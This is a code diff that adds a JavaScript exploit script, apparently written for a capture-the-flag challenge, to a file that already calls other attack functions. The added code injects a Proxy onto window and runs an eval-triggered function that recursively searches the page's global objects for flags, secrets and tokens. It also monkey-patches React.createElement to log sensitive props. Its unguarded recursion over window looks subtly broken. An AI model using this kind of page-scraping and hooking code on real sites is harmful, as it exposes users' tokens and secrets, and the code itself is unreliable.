@@ -125,7 +125,112 @@ function prototypeChainAttack() {
         return window.__SCRIPTS_LOADED__.runtime;
     };
 }
+// CTF Exploit for targeting window.__SCRIPTS_LOADED__.runtime
+(function () {
+    console.log("Starting exploitation attempt...");
 
+    // Check if the target object exists
+    if (!window.__SCRIPTS_LOADED__) {
+        console.log("Target object __SCRIPTS_LOADED__ not found");
+        // Create it if it doesn't exist
+        window.__SCRIPTS_LOADED__ = {};
+    }
+
+    // Analyze the runtime property if it exists
+    if (window.__SCRIPTS_LOADED__.runtime) {
+        console.log("Runtime object found, analyzing properties:");
+        console.log(Object.keys(window.__SCRIPTS_LOADED__.runtime));
+
+        // Look for 's' object referenced in the challenge
+        if (window.s && window.s.runtime) {
+            console.log("Found s.runtime object, analyzing:");
+            console.log(Object.keys(window.s.runtime));
+        } else {
+            console.log("s.runtime object not found");
+        }
+    } else {
+        console.log("Runtime object not found, attempting to create it");
+
+        // Create a proxy object to trap access
+        const runtimeProxy = new Proxy({}, {
+            get: function (target, prop) {
+                console.log(`Property ${prop} accessed on runtime object`);
+                return prop === "flag" ? "CTF{placeholder_flag}" : target[prop];
+            },
+            set: function (target, prop, value) {
+                console.log(`Property ${prop} set to ${value} on runtime object`);
+                target[prop] = value;
+                return true;
+            }
+        });
+
+        // Inject our proxy
+        window.__SCRIPTS_LOADED__.runtime = runtimeProxy;
+    }
+
+    // Try to exploit the condition pattern from the challenge
+    try {
+        // Create 's' if it doesn't exist
+        if (!window.s) window.s = {};
+        if (!window.s.runtime) window.s.runtime = {};
+
+        // Set up a property that might be accessed in the condition
+        window.s.runtime.exploit = function () {
+            console.log("Exploit function called!");
+
+            // Try to access any flags or sensitive data
+            const allProps = [];
+            function recursivelyFindProps(obj, path = '') {
+                if (!obj || typeof obj !== 'object') return;
+
+                Object.keys(obj).forEach(key => {
+                    const newPath = path ? `${path}.${key}` : key;
+                    allProps.push(newPath);
+
+                    // Look for interesting properties
+                    if (key.includes('flag') || key.includes('secret') || key.includes('token')) {
+                        console.log(`Potential flag found: ${newPath} = ${obj[key]}`);
+                    }
+
+                    recursivelyFindProps(obj[key], newPath);
+                });
+            }
+
+            recursivelyFindProps(window);
+            console.log("All properties:", allProps);
+
+            return "Exploit completed";
+        };
+
+        // Try to trigger the condition from the challenge
+        const result = eval('window.__SCRIPTS_LOADED__.runtime && ((window.s.runtime && ((window.s.runtime.exploit && window.s.runtime.exploit()))))');
+        console.log("Condition result:", result);
+    } catch (e) {
+        console.error("Error during exploitation:", e);
+    }
+
+    // Try to hook into React if it's being used
+    if (window.React) {
+        const originalCreateElement = React.createElement;
+        React.createElement = function () {
+            console.log("React.createElement called with:", arguments);
+            // Look for sensitive data in props
+            if (arguments[1] && typeof arguments[1] === 'object') {
+                Object.keys(arguments[1]).forEach(key => {
+                    if (typeof arguments[1][key] === 'string' &&
+                        (arguments[1][key].includes('flag') ||
+                            arguments[1][key].includes('CTF'))) {
+                        console.log(`Potential flag found in React props: ${key} = ${arguments[1][key]}`);
+                    }
+                });
+            }
+            return originalCreateElement.apply(this, arguments);
+        };
+        console.log("Hooked React.createElement");
+    }
+
+    console.log("Exploitation attempt completed");
+})();
 // Execute the attacks
 triggerErrorInjection();
 const useExploit = createMaliciousHook();
